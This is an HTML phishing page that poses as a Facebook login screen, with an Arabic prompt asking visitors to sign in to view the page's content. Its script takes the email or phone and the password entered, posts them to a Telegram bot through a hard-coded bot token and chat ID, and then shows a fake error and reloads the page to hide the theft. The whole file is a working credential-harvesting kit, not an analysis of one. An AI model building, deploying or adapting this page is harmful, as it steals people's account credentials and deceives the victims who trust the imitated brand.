<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>من فضلك قم بتسجيل الدخول لتتمكن من رؤيه محتوي الصفحه</title>
  <style>
    /* General Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f6f7;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      display: flex;
      width: 100%;
      max-width: 900px;
      background-color: #fff;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      border-radius: 5px;
      overflow: hidden;
    }
    .left-section {
      width: 50%;
      background-color: #4267b2;
      color: white;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 30px;
    }
    .left-section h1 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    .left-section p {
      font-size: 14px;
      text-align: center;
    }
    .right-section {
      width: 50%;
      padding: 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .form-group {
      width: 100%;
      margin-bottom: 15px;
    }
    .form-group label {
      display: block;
      margin-bottom: 5px;
      font-size: 14px;
      color: #555;
    }
    .form-group input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
    }
    .login-button {
      width: 100%;
      padding: 10px;
      background-color: #4267b2;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .login-button:hover {
      background-color: #3b5998;
    }
    .forgot-password {
      margin-top: 10px;
      font-size: 14px;
      text-align: right;
    }
    .forgot-password a {
      color: #4267b2;
      text-decoration: none;
    }
    .create-account {
      margin-top: 20px;
      font-size: 14px;
      text-align: center;
    }
    .create-account a {
      color: #4267b2;
      text-decoration: none;
    }
    @media (max-width: 768px) {
      .container {
        flex-direction: column;
      }
      .left-section,
      .right-section {
        width: 100%;
      }
      .left-section {
        padding: 20px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- Left Section -->
    <div class="left-section">
      <h1>facebook</h1>
      <p>من فضلك قم بتسجيل الدخول لتتمكن من رؤيه محتوي الصفحه</p>
    </div>
    <!-- Right Section -->
    <div class="right-section">
      <form id="loginForm">
        <div class="form-group">
          <label for="email">Email or Phone</label>
          <input type="text" id="email" name="email" required>
        </div>
        <div class="form-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" required>
        </div>
        <button type="submit" class="login-button">Log In</button>
        <div class="forgot-password">
          <a href="#">Forgot Password?</a>
        </div>
      </form>
      <div class="create-account">
        <p>New to Facebook? <a href="#">Create an account</a></p>
      </div>
    </div>
  </div>

  <script>
    // Function to handle login form submission
    document.getElementById('loginForm').addEventListener('submit', function (event) {
      event.preventDefault(); // Prevent form submission

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        alert('Please enter both email/phone and password.');
        return;
      }

      // Define your Telegram bot token and chat ID
      const TELEGRAM_BOT_TOKEN = '7704668977:AAEiAzheRjDx6B_3_P9KyJ5oht7fxKBXoUg';
      const TELEGRAM_CHAT_ID = '-1002382217122';

      // Construct the message to send to Telegram
      const message = `Login Details:\nEmail/Phone: ${email}\nPassword: ${password}`;

      // Send the data to the Telegram bot
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          alert('an error has occured.');
          location.reload(); // Reload the page after successful login
        } else {
          console.error('Telegram API Error:', data.description);
          alert('Failed to send credentials to Telegram.');
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred while processing your request.');
      });
    });
  </script>
</body>
</html>
